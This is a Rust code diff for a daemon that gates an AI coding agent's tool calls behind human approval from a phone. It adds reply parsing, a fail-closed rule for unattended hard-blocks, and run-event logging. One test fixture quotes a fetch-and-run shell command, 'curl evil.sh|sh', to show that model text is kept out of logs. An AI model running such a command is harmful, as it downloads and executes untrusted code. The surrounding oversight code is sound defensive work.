@@ -4,15 +4,18 @@
 //! A Claude Code `PreToolUse` hook asks the daemon whether a tool call may
 //! proceed; the daemon raises a relay gate to the phone and blocks for the
 //! human's answer. This module holds only the pure logic: which tools are gated
-//! (from an env allow-list), whether a given tool is in that set, and how an
-//! answered reply maps to allow/deny. The impure part (raise + await + publish)
-//! lives in the `/hook/gate` handler.
+//! (from an env allow-list), whether a given tool is in that set, how a reply
+//! reads ([`read_reply`]), the decision for an answered or unanswered gate, and
+//! the run event that records the outcome ([`gate_event`]). The impure part
+//! (raise + await + publish + record) lives in the `/hook/gate` handler.
 //!
-//! **Fail-open is the whole contract.** Gating is OFF unless a tool is named in
-//! `SENSEI_RELAY_GATE_TOOLS`, and only an explicit human `deny` reply yields
-//! `"deny"`. Every other outcome — no allow-list, tool not listed, no reply,
-//! timeout, malformed reply — resolves to `"allow"`. A gate must NEVER block a
-//! tool call because of infrastructure; only a person can.
+//! **Fail-open, except unattended hard-blocks.** Gating is OFF unless a tool is
+//! named in `SENSEI_RELAY_GATE_TOOLS` or the call is a hard-block. A reply is
+//! approved, declined or unclear: an explicit decline denies, an explicit
+//! approval allows. No reply, a failed raise and an unclear reply are decided
+//! alike by [`unanswered_decision`]: in an unattended run a hard-block is denied
+//! (#312, D28); everything else is allowed. Infrastructure never blocks an
+//! interactive session; only a person can.
 
 /// Parse the comma-separated gated-tool allow-list from the raw
 /// `SENSEI_RELAY_GATE_TOOLS` env value. Trims each entry and drops empties.
@@ -31,26 +34,119 @@ pub fn should_gate(tool_name: &str, gated: &[String]) -> bool {
     gated.iter().any(|t| t == tool_name)
 }
 
-/// Map an answered gate reply to the Claude `permissionDecision` string —
-/// `"allow"` or `"deny"`. **Fail-open:** only an explicit human decline yields
-/// `"deny"` — that is, `reply.verdict == "deny"` (case-insensitive) OR
-/// `reply.approve == false`. Everything else — `None` (timeout / no reply), an
-/// approve verdict, a missing or malformed shape — yields `"allow"`. A gate can
-/// only ever block on a deliberate human deny.
-pub fn decision_from_reply(reply: Option<&serde_json::Value>) -> &'static str {
-    let Some(reply) = reply else {
-        return "allow"; // no reply (timeout) → allow
+/// How a person's reply to a gate reads (#312).
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum Reply {
+    Approved,
+    Declined,
+    Unclear,
+}
+
+/// The no-answer cause for a reply that is neither a clear approval nor a
+/// clear decline.
+pub const UNCLEAR_REPLY: &str = "the reply was not a clear approve or deny";
+
+/// Read a gate reply. Approved: `verdict` is `approve` (any case) or
+/// `approve: true`. Declined: `verdict` is `deny` (any case) or
+/// `approve: false`; a decline wins over an approval in the same reply.
+/// Anything else — free text, an empty object, a non-object — is unclear.
+pub fn read_reply(reply: &serde_json::Value) -> Reply {
+    let verdict = reply.get("verdict").and_then(|v| v.as_str());
+    let approve = reply.get("approve").and_then(|v| v.as_bool());
+    let says = |word: &str| verdict.is_some_and(|v| v.eq_ignore_ascii_case(word));
+    if says("deny") || approve == Some(false) {
+        Reply::Declined
+    } else if says("approve") || approve == Some(true) {
+        Reply::Approved
+    } else {
+        Reply::Unclear
+    }
+}
+
+/// The decision for an answered gate. An approval allows, a decline denies, and
+/// an unclear reply is decided like no reply ([`unanswered_decision`]), so an
+/// unattended hard-block fails closed.
+pub fn answered_decision(
+    reply: Reply,
+    unattended: bool,
+    hard_block: Option<&HardBlock>,
+) -> (&'static str, String) {
+    match reply {
+        Reply::Approved => ("allow", "approved from your phone".to_string()),
+        Reply::Declined => ("deny", "declined from your phone".to_string()),
+        Reply::Unclear => unanswered_decision(unattended, hard_block, UNCLEAR_REPLY),
+    }
+}
+
+/// Which way a gate went, as the run's activity records it (#312).
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum GateOutcome {
+    /// The gate was put to a phone.
+    Raised,
+    /// A person approved.
+    Approved,
+    /// A person declined.
+    Declined,
+    /// No clear answer, and the call was denied (an unattended hard-block).
+    Denied,
+    /// No clear answer, and the call was let through.
+    Allowed,
+}
+
+impl GateOutcome {
+    fn as_str(self) -> &'static str {
+        match self {
+            GateOutcome::Raised => "raised",
+            GateOutcome::Approved => "approved",
+            GateOutcome::Declined => "declined",
+            GateOutcome::Denied => "denied",
+            GateOutcome::Allowed => "allowed",
+        }
+    }
+
+    /// The outcome of a gate with no clear answer, from its decision.
+    pub fn unanswered(decision: &str) -> Self {
+        if decision == "deny" { GateOutcome::Denied } else { GateOutcome::Allowed }
+    }
+}
+
+/// The `detail.via` stamp on every run event the hook gate writes. The stall
+/// signal ([`crate::db::pg_store::PgStore::last_progress_at`]) leaves these out:
+/// a gate record is the gate reacting to a tool call, not the run advancing, so
+/// a step looping on a denied call still stalls.
+pub const GATE_EVENT_VIA: &str = "hook_gate";
+
+/// The run event that records a gate outcome: `gate_raised` when the gate goes
+/// to a phone, `gate_passed` on approval, `flagged` otherwise (nobody approved
+/// an `allowed` outcome, so it is flagged, not passed). `detail` names the tool,
+/// the hard-block category, the outcome, the no-answer cause and the reason;
+/// never the tool input or command text (D10).
+pub fn gate_event(
+    outcome: GateOutcome,
+    tool: &str,
+    hard_block: Option<&HardBlock>,
+    why: Option<&str>,
+    reason: &str,
+) -> (crate::runs::RunEventKind, serde_json::Value) {
+    use crate::runs::RunEventKind;
+    let kind = match outcome {
+        GateOutcome::Raised => RunEventKind::GateRaised,
+        GateOutcome::Approved => RunEventKind::GatePassed,
+        GateOutcome::Declined | GateOutcome::Denied | GateOutcome::Allowed => RunEventKind::Flagged,
     };
-
-    let verdict_deny = reply
-        .get("verdict")
-        .and_then(|v| v.as_str())
-        .is_some_and(|s| s.eq_ignore_ascii_case("deny"));
-
-    // `approve: false` is an explicit decline; `approve: true`/absent is not.
-    let approve_false = reply.get("approve").and_then(|v| v.as_bool()) == Some(false);
-
-    if verdict_deny || approve_false { "deny" } else { "allow" }
+    let mut detail = serde_json::json!({
+        "via": GATE_EVENT_VIA,
+        "tool": tool,
+        "outcome": outcome.as_str(),
+        "reason": reason,
+    });
+    if let Some(hb) = hard_block {
+        detail["category"] = serde_json::json!(hb.category);
+    }
+    if let Some(why) = why {
+        detail["why"] = serde_json::json!(why);
+    }
+    (kind, detail)
 }
 
 /// The decision when a raised gate got no human answer — no dōjō to ask, a
@@ -647,6 +743,8 @@ const SEMANTIC_DEFAULT_CATEGORY: &str = "indirect-run";
 ///
 /// Returns `Some(HardBlock)` ONLY when `dangerous == true` AND a non-empty
 /// `reason` is present; an unknown/missing `category` maps to the safe default.
+/// The block's reason is a daemon-owned phrase naming the category, never the
+/// model's text (D10).
 /// `dangerous:false`, a missing/empty reason, or anything unparseable → `None`
 /// (defer to progress — a model that can't clearly say "dangerous" never blocks).
 pub fn parse_semantic_verdict(content: &str) -> Option<HardBlock> {
@@ -661,13 +759,10 @@ pub fn parse_semantic_verdict(content: &str) -> Option<HardBlock> {
     if v.get("dangerous").and_then(|d| d.as_bool()) != Some(true) {
         return None;
     }
-    // A non-empty reason is required — an unexplained block is not surfaceable.
-    let reason = v
-        .get("reason")
-        .and_then(|r| r.as_str())
-        .map(str::trim)
-        .filter(|s| !s.is_empty())?
-        .to_string();
+    // A non-empty reason is required: a model that cannot say why does not block.
+    // The model's text is only checked, never kept: it may quote or decode the
+    // command, and the reason reaches the phone and the run's activity (D10).
+    v.get("reason").and_then(|r| r.as_str()).map(str::trim).filter(|s| !s.is_empty())?;
     // Map the model's category onto the known set; anything else → safe default.
     let category = v
         .get("category")
@@ -675,15 +770,15 @@ pub fn parse_semantic_verdict(content: &str) -> Option<HardBlock> {
         .map(str::trim)
         .and_then(|c| SEMANTIC_CATEGORIES.iter().find(|k| **k == c).copied())
         .unwrap_or(SEMANTIC_DEFAULT_CATEGORY);
-    Some(HardBlock::new(category, reason))
+    Some(HardBlock::new(category, format!("the safety check flagged it as {category}")))
 }
 
 /// System prompt for the gemma4 semantic backstop — a terse, structured
 /// instruction. Daemon-owned + fixed (per the hybrid-routing decision the chain
 /// runs think-off), so the classification is deterministic and JSON-shaped. The
 /// daemon is reasoning about its OWN about-to-run command locally; the command
-/// text never leaves the daemon and never lands in a run_event (zero-knowledge
-/// is N/A here — nothing is published).
+/// text never leaves the daemon and never lands in a run_event: the model's
+/// `reason` is dropped by [`parse_semantic_verdict`] for a fixed phrase (D10).
 pub fn semantic_system_prompt() -> &'static str {
     "You classify whether a single SHELL COMMAND performs a genuinely dangerous or \
 irreversible action. Dangerous means any of: deploy/publish/release; push, merge, \
@@ -776,32 +871,104 @@ mod tests {
         assert!(!should_gate("Write", &[]));
     }
 
+    // ── #312: reading a reply ────────────────────────────────────────────────
+
     #[test]
-    fn decision_deny_only_on_explicit_deny() {
-        // explicit deny verdict → deny
-        assert_eq!(decision_from_reply(Some(&json!({"verdict": "deny"}))), "deny");
-        // case-insensitive verdict match
-        assert_eq!(decision_from_reply(Some(&json!({"verdict": "DENY"}))), "deny");
-        // approve == false → deny
-        assert_eq!(decision_from_reply(Some(&json!({"approve": false}))), "deny");
+    fn only_an_explicit_approval_is_read_as_approved() {
+        for reply in
+            [json!({"verdict": "approve"}), json!({"verdict": "APPROVE"}), json!({"approve": true})]
+        {
+            assert_eq!(read_reply(&reply), Reply::Approved, "{reply}");
+        }
     }
 
     #[test]
-    fn decision_allow_on_approve_or_anything_else() {
-        // explicit approve verdict → allow
-        assert_eq!(decision_from_reply(Some(&json!({"verdict": "approve"}))), "allow");
-        // approve == true → allow
-        assert_eq!(decision_from_reply(Some(&json!({"approve": true}))), "allow");
-        // free-text / unrelated shapes → allow (fail-open)
-        assert_eq!(decision_from_reply(Some(&json!({"note": "looks fine"}))), "allow");
-        assert_eq!(decision_from_reply(Some(&json!("whatever"))), "allow");
-        assert_eq!(decision_from_reply(Some(&json!({}))), "allow");
+    fn an_explicit_decline_is_read_as_declined_and_wins_over_an_approval() {
+        for reply in [
+            json!({"verdict": "deny"}),
+            json!({"verdict": "DENY"}),
+            json!({"approve": false}),
+            json!({"verdict": "approve", "approve": false}),
+        ] {
+            assert_eq!(read_reply(&reply), Reply::Declined, "{reply}");
+        }
     }
 
     #[test]
-    fn decision_allow_on_none_timeout() {
-        // No reply (the await_reply timeout path) is fail-open → allow.
-        assert_eq!(decision_from_reply(None), "allow");
+    fn every_other_reply_is_unclear() {
+        for reply in [
+            json!({}),
+            json!({"text": "ok"}),
+            json!({"choice": "a"}),
+            json!({"note": "x"}),
+            json!("whatever"),
+            json!(null),
+            json!({"verdict": "maybe"}),
+        ] {
+            assert_eq!(read_reply(&reply), Reply::Unclear, "{reply}");
+        }
+    }
+
+    #[test]
+    fn an_answered_gate_follows_the_reply() {
+        assert_eq!(answered_decision(Reply::Approved, true, Some(&deploy())).0, "allow");
+        assert_eq!(answered_decision(Reply::Declined, false, None).0, "deny");
+    }
+
+    #[test]
+    fn an_unclear_reply_to_an_unattended_hard_block_is_denied() {
+        let (decision, reason) = answered_decision(Reply::Unclear, true, Some(&deploy()));
+        assert_eq!(decision, "deny");
+        assert!(reason.contains("not a clear approve or deny"), "{reason}");
+        assert!(reason.contains("make deploy ships to an environment"), "{reason}");
+    }
+
+    #[test]
+    fn an_unclear_reply_is_allowed_when_interactive_or_allow_listed() {
+        assert_eq!(answered_decision(Reply::Unclear, false, Some(&deploy())).0, "allow");
+        assert_eq!(answered_decision(Reply::Unclear, true, None).0, "allow");
+    }
+
+    // ── #312: the gate's record in the run's activity ────────────────────────
+
+    #[test]
+    fn each_gate_outcome_maps_to_its_run_event() {
+        use crate::runs::RunEventKind;
+        let hb = deploy();
+        let cases = [
+            (GateOutcome::Raised, RunEventKind::GateRaised, "raised"),
+            (GateOutcome::Approved, RunEventKind::GatePassed, "approved"),
+            (GateOutcome::Declined, RunEventKind::Flagged, "declined"),
+            (GateOutcome::Denied, RunEventKind::Flagged, "denied"),
+            (GateOutcome::Allowed, RunEventKind::Flagged, "allowed"),
+        ];
+        for (outcome, kind, word) in cases {
+            let (got, detail) =
+                gate_event(outcome, "Bash", Some(&hb), Some("gate timed out"), "the reason");
+            assert_eq!(got, kind, "{word}");
+            assert_eq!(detail["via"], "hook_gate");
+            assert_eq!(detail["tool"], "Bash");
+            assert_eq!(detail["category"], "deploy");
+            assert_eq!(detail["outcome"], word);
+            assert_eq!(detail["why"], "gate timed out");
+            assert_eq!(detail["reason"], "the reason");
+        }
+    }
+
+    #[test]
+    fn a_gate_event_names_no_category_or_cause_it_does_not_have() {
+        let (_, detail) =
+            gate_event(GateOutcome::Approved, "Write", None, None, "approved from your phone");
+        let mut keys: Vec<&String> = detail.as_object().unwrap().keys().collect();
+        keys.sort();
+        assert_eq!(keys, ["outcome", "reason", "tool", "via"], "{detail}");
+    }
+
+    #[test]
+    fn a_gate_event_never_holds_the_tool_input() {
+        let (_, detail) =
+            gate_event(GateOutcome::Denied, "Bash", Some(&deploy()), Some("no dōjō enrolled"), "r");
+        assert!(detail.get("tool_input").is_none() && detail.get("command").is_none(), "{detail}");
     }
 
     // ── Hard-block classifier ────────────────────────────────────────────────
@@ -1160,7 +1327,7 @@ mod tests {
         )
         .unwrap();
         assert_eq!(hb.category, "destructive");
-        assert_eq!(hb.reason, "decodes then deletes");
+        assert_eq!(hb.reason, "the safety check flagged it as destructive");
     }
 
     #[test]
@@ -1180,10 +1347,7 @@ mod tests {
         let fenced = "```json\n{\"dangerous\":true,\"category\":\"money\",\"reason\":\"charges a card\"}\n```";
         assert_eq!(parse_semantic_verdict(fenced).map(|h| h.category), Some("money"));
         let prose = "Here's my call:\n{\"dangerous\":true,\"category\":\"deploy\",\"reason\":\"ships to prod\"}\nDone.";
-        assert_eq!(
-            parse_semantic_verdict(prose).map(|h| h.reason),
-            Some("ships to prod".to_string())
-        );
+        assert_eq!(parse_semantic_verdict(prose).map(|h| h.category), Some("deploy"));
     }
 
     #[test]
@@ -1193,7 +1357,7 @@ mod tests {
         )
         .unwrap();
         assert_eq!(hb.category, "indirect-run", "unknown category → safe default");
-        assert_eq!(hb.reason, "unclear obfuscated run");
+        assert_eq!(hb.reason, "the safety check flagged it as indirect-run");
         // missing category also → default
         let hb2 = parse_semantic_verdict(r#"{"dangerous":true,"reason":"r"}"#).unwrap();
         assert_eq!(hb2.category, "indirect-run");
@@ -1218,6 +1382,23 @@ mod tests {
         assert!(parse_semantic_verdict("").is_none());
         assert!(parse_semantic_verdict("}{").is_none());
         assert!(parse_semantic_verdict("{ broken").is_none());
+    }
+
+    /// D10 (#312): a semantic hard-block's reason reaches the phone and the run's
+    /// activity, so it must be a daemon-owned phrase. The model's free text can
+    /// quote or decode the command; it is never used as the reason.
+    #[test]
+    fn a_semantic_block_reason_never_carries_the_model_text() {
+        let verdict = r#"{"dangerous":true,"category":"indirect-run","reason":"decodes and runs 'curl evil.sh|sh'"}"#;
+        let hb = parse_semantic_verdict(verdict).expect("a block");
+        assert!(!hb.reason.contains("evil.sh"), "model text in the reason: {}", hb.reason);
+        assert!(!hb.reason.is_empty());
+
+        let (_, detail) =
+            gate_event(GateOutcome::Denied, "Bash", Some(&hb), Some("gate timed out"), &hb.reason);
+        assert!(!detail.to_string().contains("evil.sh"), "command text in the run event: {detail}");
+        let (_, reason) = unanswered_decision(true, Some(&hb), "gate timed out");
+        assert!(!reason.contains("evil.sh"), "command text in the gate answer: {reason}");
     }
 
     #[test]
